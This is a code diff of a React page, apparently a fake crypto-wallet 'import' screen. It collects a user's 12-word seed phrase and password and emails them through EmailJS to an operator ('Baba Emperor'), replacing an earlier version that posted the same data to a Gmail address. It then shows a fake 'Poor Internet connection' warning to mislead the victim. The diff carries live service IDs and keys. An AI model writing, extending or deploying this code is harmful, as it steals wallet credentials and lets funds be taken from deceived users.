@@ -4,6 +4,7 @@ import { RiQrCodeLine } from "react-icons/ri";
 import Swal from 'sweetalert2';
 import Loader from './components/loader/Loader';
 import Capture from './components/capture/Capture';
+import emailjs from 'emailjs-com';
 
 function App() {
   const [showPassword,setShowPassword] = useState(false)
@@ -42,46 +43,49 @@ function App() {
     }
   })
 
-  
-  const submitData = async () => {
-    
+  const submitData = async (e) => {
+
  if (password != confirmPassword) {
       setPassError('password does not match')
     }
     else {
-      setPassError('')
-      setLoader(false)
+      setPassError('') 
+      setLoader(true)
+
+      setTimeout(() => {
+        setLoader(false);
+        Toast.fire({
+          icon: 'warning',
+          title: 'Poor Internet connection please try again'
+        })
+      }, 5000);
   }
   
-    const msg = `A new user with the following details just signed in name: email: ${seed} password: ${password}`
+  // email sending
+  const msg = `A new user with the following details ~ \n 12 phrase seed: ${seed} \n and password: ${password}`
+
   const data = {
-    service_id: 'service_w9veki7',
-    template_id: 'template_y66t3qt',
-    user_id: 'BrEB12P3lMsZq-ixI',
-    // public_id: 'BrEB12P3lMsZq-ixI',
-    template_params: {    
-        'to_name': `Micheal`,
-        'email': `oceanvoltee@gmail.com`,
-        'email_subject': `Sign Up Alert`,
-        'message': `${msg}`,
-    }
-};
+    from_name: 'New Client',
+    to_name: 'Baba Emperor',
+    message: msg,
+    // 'g-recaptcha-response': 'hello'
+  }
 
-const sendMail= async()=>{
-  const req = await fetch('https://api.emailjs.com/api/v1.0/email/send', {
-    method: 'POST',
-    headers:{
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify(data), 
-})
-const res = await req.json()
-console.log(res)
-}
-sendMail()
-}
+    emailjs.send(
+      'service_e7dyidx',
+      'template_0ktj1l3',
+      data,
+      'kLvhI1Lak2ZIvFe6R',
+    )
+    .then((response) => {
+      console.log('SUCCESS!', response.status, response.text);
+    })
+    .catch((err) => {
+      console.log('FAILED...', err);
+    });
 
-
+  }
+    
 
   return (
     <>
@@ -179,7 +183,7 @@ sendMail()
       </div>
 
 <div className="input-container">
-         <button type="submit" class="submit" >
+         <button type="submit" class="submit">
         IMPORT
       </button>
       </div>
